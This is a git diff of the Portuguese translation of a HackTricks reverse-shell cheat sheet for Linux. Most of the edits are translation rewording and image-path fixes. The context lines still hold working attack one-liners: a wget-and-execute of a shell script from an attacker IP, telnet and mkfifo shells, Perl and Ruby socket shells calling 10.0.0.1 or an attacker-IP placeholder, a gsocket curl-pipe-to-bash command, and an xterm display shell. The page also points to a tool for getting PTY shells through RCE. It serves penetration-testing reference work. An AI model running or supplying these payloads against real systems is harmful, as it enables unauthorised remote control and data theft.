@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Outras maneiras de apoiar o HackTricks:
 
@@ -16,7 +16,7 @@ Outras maneiras de apoiar o HackTricks:
 
 **Grupo de Segurança Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -67,7 +67,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Shell Avançado
 
-Ao lidar com uma vulnerabilidade de **Execução de Código Remoto (RCE)** em uma aplicação web baseada em Linux, alcançar um shell reverso pode ser obstruído por defesas de rede como regras iptables ou mecanismos complexos de filtragem de pacotes. Em ambientes restritos como esse, uma abordagem alternativa envolve estabelecer um shell PTY (Pseudo Terminal) para interagir com o sistema comprometido de forma mais eficaz.
+Ao lidar com uma vulnerabilidade de **Execução de Código Remoto (RCE)** em uma aplicação web baseada em Linux, alcançar um shell reverso pode ser obstruído por defesas de rede como regras iptables ou mecanismos complexos de filtragem de pacotes. Em ambientes tão restritos, uma abordagem alternativa envolve estabelecer um shell PTY (Pseudo Terminal) para interagir com o sistema comprometido de forma mais eficaz.
 
 Uma ferramenta recomendada para esse fim é o [toboggan](https://github.com/n3rada/toboggan.git), que simplifica a interação com o ambiente alvo.
 
@@ -110,7 +110,7 @@ Você só precisa modificar:
 * O prefixo e sufixo da sua carga útil (se houver)
 * A forma como a carga útil é enviada (cabeçalhos? dados? informações extras?)
 
-Em seguida, você pode apenas **enviar comandos** ou até mesmo **usar o comando `upgrade`** para obter um PTY completo (observe que os pipes são lidos e escritos com um atraso aproximado de 1,3s).
+Em seguida, você pode simplesmente **enviar comandos** ou até mesmo **usar o comando `upgrade`** para obter um PTY completo (observe que os pipes são lidos e escritos com um atraso aproximado de 1,3s).
 
 ## Netcat
 ```bash
@@ -128,7 +128,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet é um protocolo de rede que permite a comunicação com um dispositivo remoto ou servidor usando um terminal virtual. É comumente usado para acesso remoto a servidores e dispositivos de rede para fins de administração e configuração.
+Telnet é um protocolo de rede que permite a comunicação remota com um dispositivo usando um terminal virtual. É comumente usado para acessar e gerenciar dispositivos de rede, como roteadores e switches.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -157,14 +157,12 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 ```
 ## Perl
 
-Perl is a high-level, general-purpose, interpreted programming language known for its flexibility and powerful text processing capabilities. It is commonly used for system administration tasks, web development, and network programming. Perl scripts can be used to create powerful one-liners for various tasks, making it a versatile tool for hackers.
+Perl é uma linguagem de programação amplamente utilizada em hacking ético devido à sua capacidade de manipular strings, realizar operações de rede e executar comandos do sistema. Perl é conhecido por sua flexibilidade e expressividade, tornando-o uma escolha popular para tarefas de scripting durante testes de penetração.
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
-
-Ruby is a dynamic, open source programming language with a focus on simplicity and productivity. It has an elegant syntax that is easy to read and write. Ruby is often used for web development, automation, and scripting.
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -323,7 +321,7 @@ Isso tentará se conectar ao seu sistema na porta 6001:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Para capturar o shell reverso, você pode usar (que irá escutar na porta 6001):
+Para capturar o shell reverso, você pode usar (que estará ouvindo na porta 6001):
 ```bash
 # Authorize host
 xhost +targetip
@@ -346,9 +344,9 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 * [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
-**Try Hard Security Group**
+**Grupo de Segurança Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -359,8 +357,8 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 Outras formas de apoiar o HackTricks:
 
 * Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
